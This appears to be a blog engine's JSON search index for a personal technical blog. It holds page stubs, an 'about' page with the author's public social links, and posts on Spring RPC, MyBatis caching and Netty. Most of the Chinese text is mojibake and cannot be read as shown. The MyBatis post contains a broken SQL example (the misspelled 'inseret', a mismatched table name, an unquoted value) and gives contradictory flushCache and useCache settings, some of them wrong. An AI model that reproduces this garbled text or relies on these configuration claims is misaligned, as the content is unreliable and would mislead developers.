{"meta":{"title":"Kayleh","subtitle":"","description":"Dreamaker","author":"Kayleh","url":"https://blog.kayleh.top","root":"/"},"pages":[{"title":"","date":"2020-09-12T08:50:18.120Z","updated":"2020-09-12T08:50:18.120Z","comments":true,"path":"google8102e2f35ce9e391.html","permalink":"https://blog.kayleh.top/google8102e2f35ce9e391.html","excerpt":"","text":"google-site-verification: google8102e2f35ce9e391.html"},{"title":"","date":"2020-09-12T08:50:18.667Z","updated":"2020-09-12T08:50:18.667Z","comments":true,"path":"mainfest.json","permalink":"https://blog.kayleh.top/mainfest.json","excerpt":"","text":"{\"name\":\"Kayleh\",\"short_name\":\"Kayleh\",\"theme_color\":\"#49b1f5\",\"background_color\":\"#49b1f5\",\"display\":\"standalone\",\"scope\":\"/\",\"start_url\":\"/\",\"icons\":[{\"src\":\"images/pwaicons/36.png\",\"sizes\":\"36x36\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/48.png\",\"sizes\":\"48x48\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/72.png\",\"sizes\":\"72x72\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/96.png\",\"sizes\":\"96x96\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/144.png\",\"sizes\":\"144x144\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/192.png\",\"sizes\":\"192x192\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/512.png\",\"sizes\":\"512x512\",\"type\":\"image/png\"}],\"splash_pages\":null}"},{"title":"","date":"2021-05-27T16:21:53.722Z","updated":"2021-05-27T16:21:26.223Z","comments":true,"path":"categories/categories.html","permalink":"https://blog.kayleh.top/categories/categories.html","excerpt":"","text":""},{"title":"å‹äººå¸","date":"2021-06-16T05:33:26.125Z","updated":"2021-06-16T05:33:26.125Z","comments":true,"path":"friends/index.html","permalink":"https://blog.kayleh.top/friends/index.html","excerpt":"","text":""},{"title":"about","date":"2020-02-12T14:14:36.000Z","updated":"2021-01-17T14:44:55.114Z","comments":false,"path":"about/index.html","permalink":"https://blog.kayleh.top/about/index.html","excerpt":"","text":",-. ,--, ,---, ,--/ /| ,--.&#39;| ,--.&#39; | ,--. :/ | | | : | | : : : &#39; / : : &#39; : : : | &#39; / ,--.--. .--, | &#39; | ,---. : | |,--. &#39; | : / \\ /_ ./| &#39; | | / \\ | : &#39; | | | \\ .--. .-. | , &#39; , &#39; : | | : / / | | | /&#39; : &#39; : |. \\ \\__\\/: . . /___/ \\: | &#39; : |__ . &#39; / | &#39; : | | | | | &#39; \\ \\ ,&quot; .--.; | . \\ &#39; | | | &#39;.&#39;| &#39; ; /| | | &#39; | : &#39; : |--&#39; / / ,. | \\ ; : ; : ; &#39; | / | | : :_:,&#39; ; |,&#39; ; : .&#39; \\ \\ \\ ; | , / | : | | | ,&#39; &#39;--&#39; | , .-./ : \\ \\ ---`-&#39; \\ \\ / `--&#39;&#39; `--`---&#39; \\ &#39; ; `----&#39; `--` Dreamaker Github: https://github.com/Kayleh Google: mailto:kaylehisdied@gmail.com Facebook: https://www.facebook.com/kayleh.yao.7 Twitter: https://twitter.com/y40jinqing Weibo: https://weibo.com/5737136689/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo Zhihu: https://www.zhihu.com/people/ni-hui-gan-xie-wo-de Linkedin: https://www.linkedin.com/in/jinqing-yao-97a750186/ wechat\" style=\"zoom: 33%;"},{"title":"å‹äººå¸","date":"2020-08-26T05:40:45.000Z","updated":"2021-05-27T09:24:28.252Z","comments":true,"path":"link/index.html","permalink":"https://blog.kayleh.top/link/index.html","excerpt":"","text":"type: link å‹æƒ…é“¾æ¥Name: KaylehBio: æ±‚çŸ¥è‹¥æ¸´,è™šå¿ƒè‹¥æ„šURL: https://kayleh.topAvatar: https://cdn.jsdelivr.net/gh/kayleh/cdn/img/2.jpg Mi Manchi Aurora å­‘ç„¶ä¸€èº« å°æ«å¶ ç™½å¤œ è‰æ—¶é›¨ ä¼šæ‰“ç¯®çƒçš„ç¨‹åºçŒ¿ åƒç¾½çš„ç¼–ç¨‹æ—¶å…‰"}],"posts":[{"title":"Spingæ¡†æ¶ç¼–å†™RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡","slug":"Javaåˆ©ç”¨Spingæ¡†æ¶ç¼–å†™RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡","date":"2021-06-06T16:20:50.000Z","updated":"2021-06-09T16:08:24.999Z","comments":true,"path":"Javaåˆ©ç”¨Spingæ¡†æ¶ç¼–å†™RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æœåŠ¡/","link":"","permalink":"https://blog.kayleh.top/Java%E5%88%A9%E7%94%A8Sping%E6%A1%86%E6%9E%B6%E7%BC%96%E5%86%99RPC%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%E6%9C%8D%E5%8A%A1/","excerpt":"","text":"https://www.jb51.net/article/87079.htm RPCï¼Œå³ Remote Procedure Callï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ï¼Œè¯´å¾—é€šä¿—ä¸€ç‚¹å°±æ˜¯ï¼šè°ƒç”¨è¿œç¨‹è®¡ç®—æœºä¸Šçš„æœåŠ¡ï¼Œå°±åƒè°ƒç”¨æœ¬åœ°æœåŠ¡ä¸€æ ·ã€‚ RPC å¯åŸºäº HTTP æˆ– TCP åè®®ï¼ŒWeb Service å°±æ˜¯åŸºäº HTTP åè®®çš„ RPCï¼Œå®ƒå…·æœ‰è‰¯å¥½çš„è·¨å¹³å°æ€§ï¼Œä½†å…¶æ€§èƒ½å´ä¸å¦‚åŸºäº TCP åè®®çš„ RPCã€‚ä¼šä¸¤æ–¹é¢ä¼šç›´æ¥å½±å“ RPC çš„æ€§èƒ½ï¼Œä¸€æ˜¯ä¼ è¾“æ–¹å¼ï¼ŒäºŒæ˜¯åºåˆ—åŒ–ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼ŒTCP æ˜¯ä¼ è¾“å±‚åè®®ï¼ŒHTTP æ˜¯åº”ç”¨å±‚åè®®ï¼Œè€Œä¼ è¾“å±‚è¾ƒåº”ç”¨å±‚æ›´åŠ åº•å±‚ï¼Œåœ¨æ•°æ®ä¼ è¾“æ–¹é¢ï¼Œè¶Šåº•å±‚è¶Šå¿«ï¼Œå› æ­¤ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒTCP ä¸€å®šæ¯” HTTP å¿«ã€‚å°±åºåˆ—åŒ–è€Œè¨€ï¼ŒJava æä¾›äº†é»˜è®¤çš„åºåˆ—åŒ–æ–¹å¼ï¼Œä½†åœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹å¼å°†ä¼šå¸¦æ¥ä¸€äº›æ€§èƒ½ä¸Šçš„ç“¶é¢ˆï¼Œäºæ˜¯å¸‚é¢ä¸Šå‡ºç°äº†ä¸€ç³»åˆ—ä¼˜ç§€çš„åºåˆ—åŒ–æ¡†æ¶ï¼Œæ¯”å¦‚ï¼šProtobufã€Kryoã€Hessianã€Jackson ç­‰ï¼Œå®ƒä»¬å¯ä»¥å–ä»£ Java é»˜è®¤çš„åºåˆ—åŒ–ï¼Œä»è€Œæä¾›æ›´é«˜æ•ˆçš„æ€§èƒ½ã€‚ ä¸ºäº†æ”¯æŒé«˜å¹¶å‘ï¼Œä¼ ç»Ÿçš„é˜»å¡å¼ IO æ˜¾ç„¶ä¸å¤ªåˆé€‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¼‚æ­¥çš„ IOï¼Œå³ NIOã€‚Java æä¾›äº† NIO çš„è§£å†³æ–¹æ¡ˆï¼ŒJava 7 ä¹Ÿæä¾›äº†æ›´ä¼˜ç§€çš„ NIO.2 æ”¯æŒï¼Œç”¨ Java å®ç° NIO å¹¶ä¸æ˜¯é¥ä¸å¯åŠçš„äº‹æƒ…ï¼Œåªæ˜¯éœ€è¦æˆ‘ä»¬ç†Ÿæ‚‰ NIO çš„æŠ€æœ¯ç»†èŠ‚ã€‚ æˆ‘ä»¬éœ€è¦å°†æœåŠ¡éƒ¨ç½²åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„ä¸åŒèŠ‚ç‚¹ä¸Šï¼Œé€šè¿‡æœåŠ¡æ³¨å†Œçš„æ–¹å¼ï¼Œè®©å®¢æˆ·ç«¯æ¥è‡ªåŠ¨å‘ç°å½“å‰å¯ç”¨çš„æœåŠ¡ï¼Œå¹¶è°ƒç”¨è¿™äº›æœåŠ¡ã€‚è¿™éœ€è¦ä¸€ç§æœåŠ¡æ³¨å†Œè¡¨ï¼ˆService Registryï¼‰çš„ç»„ä»¶ï¼Œè®©å®ƒæ¥æ³¨å†Œåˆ†å¸ƒå¼ç¯å¢ƒä¸‹æ‰€æœ‰çš„æœåŠ¡åœ°å€ï¼ˆåŒ…æ‹¬ï¼šä¸»æœºåä¸ç«¯å£å·ï¼‰ã€‚","categories":[],"tags":[]},{"title":"mybatis-cache","slug":"mybatis-ç¼“å­˜","date":"2021-05-29T15:49:32.000Z","updated":"2021-05-29T17:02:08.102Z","comments":true,"path":"mybatis-ç¼“å­˜/","link":"","permalink":"https://blog.kayleh.top/mybatis-%E7%BC%93%E5%AD%98/","excerpt":"","text":"mybatis-ç¼“å­˜ä»€ä¹ˆæ˜¯ç¼“å­˜ï¼Ÿç¼“å­˜å°±æ˜¯å­˜å‚¨æ•°æ®çš„ä¸€ä¸ªåœ°æ–¹ï¼ˆç§°ä½œï¼šCacheï¼‰ï¼Œå½“ç¨‹åºè¦è¯»å–æ•°æ®æ—¶ï¼Œä¼šé¦–å…ˆä»ç¼“å­˜ä¸­è·å–ï¼Œæœ‰åˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™ä»å…¶ä»–å­˜å‚¨è®¾å¤‡ä¸­è·å–ï¼Œç¼“å­˜æœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯ä»å…¶å†…éƒ¨è·å–æ•°æ®çš„é€Ÿåº¦æ˜¯éå¸¸å¿«çš„ï¼Œé€šè¿‡ç¼“å­˜å¯ä»¥åŠ å¿«æ•°æ®çš„è®¿é—®é€Ÿåº¦ã€‚æ¯”å¦‚æˆ‘ä»¬ä»dbä¸­è·å–æ•°æ®ï¼Œä¸­é—´éœ€è¦ç»è¿‡ç½‘ç»œä¼ è¾“è€—æ—¶ï¼Œdb serverä»ç£ç›˜è¯»å–æ•°æ®è€—æ—¶ç­‰ï¼Œå¦‚æœè¿™äº›æ•°æ®ç›´æ¥æ”¾åœ¨jvmå¯¹åº”çš„å†…å­˜ä¸­ï¼Œè®¿é—®æ˜¯ä¸æ˜¯ä¼šå¿«å¾ˆå¤šã€‚ mybatisä¸­çš„ç¼“å­˜mybatisä¸­åˆ†ä¸ºä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜ã€‚ ä¸€çº§ç¼“å­˜æ˜¯SqlSessionçº§åˆ«çš„ç¼“å­˜ï¼Œåœ¨æ“ä½œæ•°æ®åº“æ—¶éœ€è¦æ„é€  sqlSessionå¯¹è±¡ï¼Œåœ¨å¯¹è±¡ä¸­æœ‰ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ˆHashMapï¼‰ç”¨äºå­˜å‚¨ç¼“å­˜æ•°æ®ï¼Œä¸åŒçš„sqlSessionä¹‹é—´çš„ç¼“å­˜æ•°æ®åŒºåŸŸï¼ˆHashMapï¼‰æ˜¯äº’ç›¸ä¸å½±å“çš„ã€‚ äºŒçº§ç¼“å­˜æ˜¯mapperçº§åˆ«çš„ç¼“å­˜ï¼Œå¤šä¸ªSqlSessionå»æ“ä½œåŒä¸€ä¸ªMapperçš„sqlè¯­å¥ï¼Œå¤šä¸ªSqlSessionå¯ä»¥å…±ç”¨äºŒçº§ç¼“å­˜ï¼ŒäºŒçº§ç¼“å­˜æ˜¯è·¨SqlSessionçš„ã€‚ ä¸€çº§ç¼“å­˜ä¸€çº§ç¼“å­˜æ˜¯SqlSessionçº§åˆ«çš„ç¼“å­˜ï¼Œæ¯ä¸ªSqlSessionéƒ½æœ‰è‡ªå·±å•ç‹¬çš„ä¸€çº§ç¼“å­˜ï¼Œå¤šä¸ªSqlSessionä¹‹é—´çš„ä¸€çº§ç¼“å­˜æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œäº’ä¸å½±å“ï¼Œmybatisä¸­ä¸€çº§ç¼“å­˜æ˜¯é»˜è®¤è‡ªåŠ¨å¼€å¯çš„ã€‚ ä¸€çº§ç¼“å­˜å·¥ä½œåŸç†ï¼šåœ¨åŒä¸€ä¸ªSqlSessionä¸­å»å¤šæ¬¡å»æ‰§è¡ŒåŒæ ·çš„æŸ¥è¯¢ï¼Œæ¯æ¬¡æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆåˆ°ä¸€çº§ç¼“å­˜ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰å°±ç›´æ¥è¿”å›ï¼Œå¦‚æœä¸€çº§ç¼“å­˜ä¸­æ²¡æœ‰ç›¸å…³æ•°æ®ï¼Œmybatiså°±ä¼šå»dbä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œç„¶åå°†æŸ¥æ‰¾åˆ°çš„æ•°æ®æ”¾å…¥ä¸€çº§ç¼“å­˜ä¸­ï¼Œç¬¬äºŒæ¬¡æ‰§è¡ŒåŒæ ·çš„æŸ¥è¯¢çš„æ—¶å€™ï¼Œä¼šå‘ç°ç¼“å­˜ä¸­å·²ç»å­˜åœ¨äº†ï¼Œä¼šç›´æ¥è¿”å›ã€‚ä¸€çº§ç¼“å­˜çš„å­˜å‚¨ä»‹è´¨æ˜¯å†…å­˜ï¼Œæ˜¯ç”¨ä¸€ä¸ªHashMapæ¥å­˜å‚¨æ•°æ®çš„ï¼Œæ‰€ä»¥è®¿é—®é€Ÿåº¦æ˜¯éå¸¸å¿«çš„ã€‚ ä¸€çº§ç¼“å­˜æ¡ˆä¾‹æ¡ˆä¾‹sqlè„šæœ¬ use &#39;test&#39;; create table user( id int auto_increment primary key comment &#39;ç”¨æˆ·id&#39;, name varchar(50) not null default &#39;&#39; comment &#39;ç”¨æˆ·å&#39;, password varchar(50) not null default &#39;&#39; comment &#39;ç”¨æˆ·å¯†ç &#39; ) comment &#39;ç”¨æˆ·è¡¨&#39;; inseret into test values (1,&#39;xiaoe&#39;,admin),(2,&#39;xiaoa&#39;,admin) ä¸‹é¢æ˜¯æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªlist &lt;select id=&quot;getList&quot; resultType=&quot;com.kayleh.bean.User&quot;&gt; select id,name,password from test &lt;where&gt; &lt;if test=&quot;id!=null&quot;&gt; and id = #{id} &lt;/if&gt; &lt;if test=&quot;name!=null and name.toString()!=&#39;&#39;&quot;&gt; and name = #{name} &lt;/if&gt; &lt;if test=&quot;password!=null&quot;&gt; and password = #{password} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; å¯¹åº”çš„mapperæ¥å£æ–¹æ³• List&lt;User&gt; getList(Map&lt;String, Object&gt; paramMap); æµ‹è¯•ç”¨ä¾‹ ä¸Šé¢çš„ä»£ç åœ¨åŒä¸€ä¸ªSqlSessionä¸­å»æ‰§è¡Œäº†2æ¬¡è·å–ç”¨æˆ·åˆ—è¡¨ä¿¡æ¯ï¼Œ2æ¬¡æŸ¥è¯¢ç»“æœåˆ†åˆ«æ”¾åœ¨userModelList1å’ŒuserModelList2ï¼Œæœ€ç»ˆä»£ç ä¸­ä¹Ÿä¼šåˆ¤æ–­è¿™ä¸¤ä¸ªé›†åˆæ˜¯å¦ç›¸ç­‰ï¼Œä¸‹é¢æˆ‘ä»¬è¿è¡Œä¸€ä¸‹çœ‹çœ‹ä¼šè®¿é—®å‡ æ¬¡dbã€‚ ä»è¾“å‡ºä¸­å¯ä»¥çœ‹å‡ºçœ‹åˆ°ï¼Œsqlåªè¾“å‡ºäº†ä¸€æ¬¡ï¼Œè¯´æ˜ç¬¬ä¸€æ¬¡ä¼šè®¿é—®æ•°æ®åº“ï¼Œç¬¬äºŒæ¬¡ç›´æ¥ä»ç¼“å­˜ä¸­è·å–çš„ï¼Œæœ€åè¾“å‡ºäº†ä¸€ä¸ªtrueï¼Œä¹Ÿè¯´æ˜ä¸¤æ¬¡è¿”å›ç»“æœæ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬äºŒæ¬¡ç›´æ¥ä»ç¼“å­˜ä¸­è·å–æ•°æ®çš„ï¼ŒåŠ å¿«äº†æŸ¥è¯¢çš„é€Ÿåº¦ã€‚ æ¸…ç©ºä¸€çº§ç¼“å­˜çš„3ç§æ–¹å¼åŒä¸€ä¸ªSqlSessionä¸­æŸ¥è¯¢åŒæ ·çš„æ•°æ®ï¼Œmybatisé»˜è®¤ä¼šä»ä¸€çº§ç¼“å­˜ä¸­è·å–ï¼Œå¦‚æœç¼“å­˜ä¸­æ²¡æœ‰ï¼Œæ‰ä¼šè®¿é—®dbï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¸Œæœ›ä¸èµ°ç¼“å­˜è€Œæ˜¯ç›´æ¥å»è®¿é—®æ•°æ®åº“ï¼Œåˆè¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿ è®©ä¸€çº§ç¼“å­˜å¤±æ•ˆæœ‰3ç§æ–¹å¼ï¼š SqlSessionä¸­æ‰§è¡Œå¢ã€åˆ ã€æ”¹æ“ä½œï¼Œæ­¤æ—¶sqlsessionä¼šè‡ªåŠ¨æ¸…ç†å…¶å†…éƒ¨çš„ä¸€çº§ç¼“å­˜ è°ƒç”¨SqlSessionä¸­çš„clearCacheæ–¹æ³•æ¸…ç†å…¶å†…éƒ¨çš„ä¸€çº§ç¼“å­˜ è®¾ç½®Mapper xmlä¸­selectå…ƒç´ çš„flushCacheå±æ€§å€¼ä¸ºtrueï¼Œé‚£ä¹ˆæ‰§è¡ŒæŸ¥è¯¢çš„æ—¶å€™ä¼šå…ˆæ¸…ç©ºä¸€çº§ç¼“å­˜ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œç„¶åå»dbä¸­è·å–æ•°æ® ä¸Šé¢æ–¹å¼ä»»ä½•ä¸€ç§éƒ½ä¼šè®©å½“å‰SqlSessionä¸­çš„ä»¥åŠç¼“å­˜å¤±æ•ˆï¼Œè¿›è€Œå»dbä¸­è·å–æ•°æ®ã€‚ ä¸€çº§ç¼“å­˜ä½¿ç”¨æ€»ç»“ä¸€çº§ç¼“å­˜æ˜¯SqlSessionçº§åˆ«çš„ï¼Œæ¯ä¸ªäººSqlSessionæœ‰è‡ªå·±çš„ä¸€çº§ç¼“å­˜ï¼Œä¸åŒçš„SqlSessionä¹‹é—´ä¸€çº§ç¼“å­˜æ˜¯ç›¸äº’éš”ç¦»çš„ mybatisä¸­ä¸€çº§ç¼“å­˜é»˜è®¤æ˜¯è‡ªåŠ¨å¼€å¯çš„ å½“åœ¨åŒä¸€ä¸ªSqlSessionä¸­æ‰§è¡ŒåŒæ ·çš„æŸ¥è¯¢çš„æ—¶å€™ï¼Œä¼šå…ˆä»ä¸€çº§ç¼“å­˜ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°äº†ç›´æ¥è¿”å›ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ä¼šå»è®¿é—®dbï¼Œç„¶åå°†dbè¿”å›çš„æ•°æ®ä¸¢åˆ°ä¸€çº§ç¼“å­˜ä¸­ï¼Œä¸‹æ¬¡æŸ¥è¯¢çš„æ—¶å€™ç›´æ¥ä»ç¼“å­˜ä¸­è·å– ä¸€çº§ç¼“å­˜æ¸…ç©ºçš„3ç§æ–¹å¼ï¼ˆ1ï¼šSqlSessionä¸­æ‰§è¡Œå¢åˆ æ”¹ä¼šä½¿ä¸€çº§ç¼“å­˜å¤±æ•ˆï¼›2ï¼šè°ƒç”¨SqlSession.clearCacheæ–¹æ³•ä¼šä½¿ä¸€çº§ç¼“å­˜å¤±æ•ˆï¼›3ï¼šMapper xmlä¸­çš„selectå…ƒç´ çš„flushCacheå±æ€§ç½®ä¸ºtrueï¼Œé‚£ä¹ˆæ‰§è¡Œè¿™ä¸ªæŸ¥è¯¢ä¼šä½¿ä¸€çº§ç¼“å­˜å¤±æ•ˆï¼‰ äºŒçº§ç¼“å­˜äºŒçº§ç¼“å­˜çš„ä½¿ç”¨ä¸€çº§ç¼“å­˜ä½¿ç”¨ä¸Šå­˜åœ¨å±€é™æ€§ï¼Œå¿…é¡»è¦åœ¨åŒä¸€ä¸ªSqlSessionä¸­æ‰§è¡ŒåŒæ ·çš„æŸ¥è¯¢ï¼Œä¸€çº§ç¼“å­˜æ‰èƒ½æå‡æŸ¥è¯¢é€Ÿåº¦ï¼Œå¦‚æœæƒ³åœ¨ä¸åŒçš„SqlSessionä¹‹é—´ä½¿ç”¨ç¼“å­˜æ¥åŠ å¿«æŸ¥è¯¢é€Ÿåº¦ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦ç”¨åˆ°äºŒçº§ç¼“å­˜äº†ã€‚ äºŒçº§ç¼“å­˜æ˜¯mapperçº§åˆ«çš„ç¼“å­˜ï¼Œæ¯ä¸ªmapper xmlæœ‰ä¸ªnamespaceï¼ŒäºŒçº§ç¼“å­˜å’Œnamespaceç»‘å®šçš„ï¼Œæ¯ä¸ªnamespaceå…³è”ä¸€ä¸ªäºŒçº§ç¼“å­˜ï¼Œå¤šä¸ªSqlSessionå¯ä»¥å…±ç”¨äºŒçº§ç¼“å­˜ï¼ŒäºŒçº§ç¼“å­˜æ˜¯è·¨SqlSessionçš„ã€‚ äºŒçº§ç¼“å­˜é»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯çš„ï¼Œéœ€è¦æˆ‘ä»¬åœ¨mybatiså…¨å±€é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œå¼€å¯ï¼š &lt;settings&gt; &lt;!--å¼€å¯äºŒçº§ç¼“å­˜--&gt; &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; &lt;/settings&gt; ä¸Šé¢é…ç½®å¥½äº†ä»¥åï¼Œè¿˜éœ€è¦åœ¨å¯¹åº”çš„mapper xmlåŠ ä¸Šä¸‹é¢é…ç½®ï¼Œè¡¨ç¤ºè¿™ä¸ªmapperä¸­çš„æŸ¥è¯¢å¼€å¯äºŒçº§ç¼“å­˜ï¼š &lt;mapper namespace=&quot;com.kayleh.mapper.UserMapper&quot;&gt; &lt;!-- å¼€å¯æœ¬mapper namespaceä¸‹çš„äºŒçº§ç¼“å­˜ --&gt; &lt;cache&gt;&lt;/cache&gt; é…ç½®å°±è¿™ä¹ˆç®€å•ã€‚ ä¸€äºŒçº§ç¼“å­˜å…±å­˜æ—¶æŸ¥è¯¢åŸç†ä¸€äºŒçº§ç¼“å­˜å¦‚æœéƒ½å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ•°æ®æŸ¥è¯¢è¿‡ç¨‹å¦‚ä¸‹ï¼š å½“å‘èµ·ä¸€ä¸ªæŸ¥è¯¢çš„æ—¶å€™ï¼Œmybatisä¼šå…ˆè®¿é—®è¿™ä¸ªnamespaceå¯¹åº”çš„äºŒçº§ç¼“å­˜ï¼Œå¦‚æœäºŒçº§ç¼“å­˜ä¸­æœ‰æ•°æ®åˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™ç»§ç»­å‘ä¸‹ æŸ¥è¯¢ä¸€çº§ç¼“å­˜ä¸­æ˜¯å¦æœ‰å¯¹åº”çš„æ•°æ®ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™ç»§ç»­å‘ä¸‹ è®¿é—®dbè·å–éœ€è¦çš„æ•°æ®ï¼Œç„¶åæ”¾åœ¨å½“å‰SqlSessionå¯¹åº”çš„äºŒçº§ç¼“å­˜ä¸­ï¼Œå¹¶ä¸”åœ¨æœ¬åœ°å†…å­˜ä¸­çš„å¦å¤–ä¸€ä¸ªåœ°æ–¹å­˜å‚¨ä¸€ä»½ï¼ˆè¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å°±å«TransactionalCacheï¼‰ å½“SqlSessionå…³é—­çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨SqlSessionçš„closeæ–¹æ³•çš„æ—¶å€™ï¼Œæ­¤æ—¶ä¼šå°†TransactionalCacheä¸­çš„æ•°æ®æ”¾åˆ°äºŒçº§ç¼“å­˜ä¸­ï¼Œå¹¶ä¸”ä¼šæ¸…ç©ºå½“å‰SqlSessionä¸€çº§ç¼“å­˜ä¸­çš„æ•°æ®ã€‚ äºŒçº§ç¼“å­˜æ¡ˆä¾‹mybatiså…¨å±€é…ç½®æ–‡ä»¶å¼€å¯äºŒçº§ç¼“å­˜é…ç½® &lt;settings&gt; &lt;!--å¼€å¯äºŒçº§ç¼“å­˜--&gt; &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; &lt;/settings&gt; mapper xmlä¸­ä½¿ç”¨cacheå…ƒç´ å¼€å¯äºŒçº§ç¼“å­˜ &lt;cache/&gt; &lt;!--å¼€å¯äºŒçº§ç¼“å­˜--&gt; &lt;select id=&quot;getList&quot; resultType=&quot;com.kayleh.bean.User&quot;&gt; select id,name,password from test &lt;where&gt; &lt;if test=&quot;id!=null&quot;&gt; and id = #{id} &lt;/if&gt; &lt;if test=&quot;name!=null and name.toString()!=&#39;&#39;&quot;&gt; and name = #{name} &lt;/if&gt; &lt;if test=&quot;password!=null&quot;&gt; and password = #{password} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; æµ‹è¯•ç”¨ä¾‹foræ‰§è¡Œäº†2æ¬¡æŸ¥è¯¢ï¼Œæ¯æ¬¡æŸ¥è¯¢éƒ½æ˜¯æ–°çš„SqlSessionã€‚ æ¸…ç©ºæˆ–è€…è·³è¿‡äºŒçº§ç¼“å­˜çš„3ç§æ–¹å¼ å½“äºŒçº§ç¼“å­˜å¼€å¯çš„æ—¶å€™ï¼Œåœ¨æŸä¸ªmapper xmlä¸­æ·»åŠ cacheå…ƒç´ ä¹‹åï¼Œè¿™ä¸ªmapper xmlä¸­æ‰€æœ‰çš„æŸ¥è¯¢éƒ½é»˜è®¤å¼€å¯äº†äºŒçº§ç¼“å­˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¸…ç©ºæˆ–è€…è·³è¿‡äºŒçº§ç¼“å­˜å‘¢ï¼Ÿ3ç§æ–¹å¼å¦‚ä¸‹ï¼š å¯¹åº”çš„mapperä¸­æ‰§è¡Œå¢åˆ æ”¹æŸ¥ä¼šæ¸…ç©ºäºŒçº§ç¼“å­˜ä¸­æ•°æ® selectå…ƒç´ çš„flushCacheå±æ€§ç½®ä¸ºtrueï¼Œä¼šå…ˆæ¸…ç©ºäºŒçº§ç¼“å­˜ä¸­çš„æ•°æ®ï¼Œç„¶åå†å»dbä¸­æŸ¥è¯¢æ•°æ®ï¼Œç„¶åå°†æ•°æ®å†æ”¾åˆ°äºŒçº§ç¼“å­˜ä¸­ selectå…ƒç´ çš„useCacheå±æ€§ç½®ä¸ºtrueï¼Œå¯ä»¥ä½¿è¿™ä¸ªæŸ¥è¯¢è·³è¿‡äºŒçº§ç¼“å­˜ï¼Œç„¶åå»æŸ¥è¯¢æ•°æ® æ€»ç»“ä¸€äºŒçº§ç¼“å­˜è®¿é—®é¡ºåºï¼šä¸€äºŒçº§ç¼“å­˜éƒ½å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œä¼šå…ˆè®¿é—®äºŒçº§ç¼“å­˜ï¼Œç„¶åå†è®¿é—®ä¸€çº§ç¼“å­˜ï¼Œæœ€åæ‰ä¼šè®¿é—®dbï¼Œè¿™ä¸ªé¡ºåºå¤§å®¶ç†è§£ä¸€ä¸‹ å°†mapper xmlä¸­selectå…ƒç´ çš„flushCacheå±æ€§ç½®ä¸ºfalseï¼Œæœ€ç»ˆä¼šæ¸…é™¤ä¸€çº§ç¼“å­˜æ‰€æœ‰æ•°æ®ï¼ŒåŒæ—¶ä¼šæ¸…é™¤è¿™ä¸ªselectæ‰€åœ¨çš„namespaceå¯¹åº”çš„äºŒçº§ç¼“å­˜ä¸­æ‰€æœ‰çš„æ•°æ® å°†mapper xmlä¸­selectå…ƒç´ çš„useCacheç½®ä¸ºfalseï¼Œä¼šä½¿è¿™ä¸ªæŸ¥è¯¢è·³è¿‡äºŒçº§ç¼“å­˜ æ€»ä½“ä¸Šæ¥è¯´ä½¿ç”¨ç¼“å­˜å¯ä»¥æå‡æŸ¥è¯¢æ•ˆç‡ï¼Œè¿™å—çŸ¥è¯†æŒæ¡äº†ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®ä¸šåŠ¡è‡ªè¡Œé€‰æ‹©","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"Head First Netty","slug":"head-first-netty","date":"2021-05-25T22:26:52.000Z","updated":"2021-05-27T07:14:13.493Z","comments":true,"path":"head-first-netty/","link":"","permalink":"https://blog.kayleh.top/head-first-netty/","excerpt":"","text":"æ€ç»´å¯¼å›¾image.png 